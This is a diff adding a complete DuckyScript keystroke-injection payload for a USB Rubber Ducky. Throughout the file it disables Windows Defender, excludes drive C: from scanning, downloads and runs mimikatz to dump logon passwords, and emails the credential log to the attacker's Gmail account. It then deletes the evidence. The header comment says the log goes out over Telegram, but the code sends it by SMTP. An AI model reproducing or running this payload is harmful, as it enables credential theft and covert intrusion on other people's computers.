@@ -1,0 +1,102 @@
+REM 0. Disable defender
+REM 1. Downloads x64 mimikatz
+REM 2. Opens a admin prompt
+REM 3. saves mimikatz log to file
+REM 4. send log over telegram
+
+REM ===== DISABLE DEFENDER =====
+DELAY 2000
+CTRL ESC
+DELAY 750
+STRING windows security
+DELAY 250
+ENTER
+DELAY 1000
+ENTER
+DELAY 500
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+ENTER
+DELAY 500
+SPACE
+DELAY 1000
+ALT y
+DELAY 1000
+ALT F4
+DELAY 500
+REM ===== EXCLUDE DISK C: =====
+GUI r
+DELAY 500
+STRING powershell
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT y
+DELAY 1000
+STRING Add-MpPreference -ExclusionPath “C:”
+ENTER
+DELAY 2000
+
+REM ===== download mimikatz =====
+STRING iwr -Uri 'https://github.com/ParrotSec/mimikatz/raw/refs/heads/master/x64/mimikatz.exe' -OutFile "c:\Windows\temp\pw.exe"
+ENTER
+DELAY 5000
+REM ===== get the passwords and save to c:\Windows\temp\mimikatz.log =====
+STRING C:\Windows\temp\pw.exe
+ENTER
+DELAY 2000
+STRING log
+DELAY 1000
+STRING privilege::debug
+ENTER
+DELAY 1000
+STRING sekurlsa::logonPasswords full
+ENTER
+DELAY 1000
+STRING exit
+ENTER
+DELAY 300
+STRING del C:\Windows\temp\pw.exe
+ENTER
+DELAY 300
+STRING $SMTPServer = 'smtp.gmail.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSsl = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('THE-PART-OF-YOUR-EMAIL-BEFORE-THE-@
+SHIFT 2
+STRING gmail.com', 'PASSWORDHERE');
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = 'THE-PART-OF-YOUR-EMAIL-BEFORE-THE-@
+SHIFT 2
+STRING gmail.com'
+ENTER
+STRING $ReportEmail.To.Add('THE-PART-OF-RECEIVERS-EMAIL-BEFORE-THE-@
+SHIFT 2
+STRING gmail.com')
+ENTER
+STRING $ReportEmail.Subject = 'Hello from the ducky'
+ENTER
+STRING $ReportEmail.Body = 'Attached is your duck report.'
+ENTER
+STRING $ReportEmail.Attachments.Add('C:\Windows\temp\mimikatz.log')
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 4000
+STRING exit
+ENTER
+STRING Remove-Item 'C:\Windows\temp\mimikatz.log';exit
+ENTER
+
+STRING exit
+ENTER
